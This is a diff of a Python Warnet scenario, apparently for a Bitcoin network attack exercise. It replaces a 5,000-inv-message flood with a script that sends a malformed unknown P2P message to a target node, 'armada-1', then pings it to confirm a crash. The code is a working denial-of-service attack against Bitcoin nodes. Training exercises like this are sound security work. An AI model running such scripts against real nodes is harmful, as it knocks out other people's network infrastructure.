@@ -1,18 +1,28 @@
 #!/usr/bin/env python3
 
 import socket
-import time
 
 from commander import Commander
 
 # The entire Bitcoin Core test_framework directory is available as a library
-from test_framework.messages import MSG_TX, CInv, msg_inv, msg_ping
+from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
 from test_framework.p2p import P2PInterface
+
+class msg_inv2:
+    __slots__ = ("inv",)
+    msgtype = b"invalid"
+
+    def __init__(self, inv=None):
+        self.inv = inv
+
+    def serialize(self):
+        return b"randominvalid"
+
 
 # The actual scenario is a class like a Bitcoin Core functional test.
 # Commander is a subclass of BitcoinTestFramework instide Warnet
 # that allows to operate on containerized nodes instead of local nodes.
-class Inv5K(Commander):
+class UnknownMessage(Commander):
     def set_test_params(self):
         # This setting is ignored but still required as
         # a sub-class of BitcoinTestFramework
@@ -20,30 +30,20 @@ class Inv5K(Commander):
 
     def add_options(self, parser):
         parser.description = (
-            "Demonstrate INV attack using a scenario and P2PInterface"
+            "Demonstrate unknown message attack using a scenario and P2PInterface"
         )
-        parser.usage = "warnet run v94_5k_invs.py --debug"
-
-    def get_node(self) : 
-        for n in self.nodes:
-            try:
-                n.getnetworkinfo()
-                node = n
-                break
-            except Exception as e:
-                continue
-
-        return node
-
+        parser.usage = "warnet run /path/to/stub_unknown_p2p.py"
 
     # Scenario entrypoint
     def run_test(self):
-        node = self.get_node()
+        # Get context from any node
+        node = self.nodes[0]
 
         # We pick a node on the network to attack
-        # We know this one is vulnderable to 5k inv messages based on it's subver
+        # We know this one is vulnderable to an unknown messages based on it's subver
+        # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
         # Change this to your teams colour if running in the battleground
-        victim = "armada-0"
+        victim = "armada-1"
 
         # The victim's address could be an explicit IP address
         # OR a kubernetes hostname (use default chain p2p port)
@@ -59,13 +59,13 @@ class Inv5K(Commander):
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
         msg = msg_inv([CInv(MSG_TX, 0x12345)])
-        for i in range(5001):
-            try:
-                attacker.send_message(msg)
-                self.log.info(f"Sent inv message {i}")
-            except:
-                continue
+        attacker.send_and_ping(msg)
+        self.log.info("Sent inv message")
 
+        self.log.info("Sending inv2 message")
+        msg = msg_inv2("oi")
+        attacker.send_message(msg)
+        
         self.log.info(f"Trying to ping {victim}...")
         self.log.info(f"Ping count: {attacker.ping_counter}")
         try:
@@ -82,9 +82,11 @@ class Inv5K(Commander):
             self.log.info(f"Ping count: {attacker.ping_counter}")
             self.log.info(f"Attack successfully completed!")
 
+        # OVER TO YOU HACKERS
+
 
 def main():
-    Inv5K().main()
+    UnknownMessage().main()
 
 
 if __name__ == "__main__":
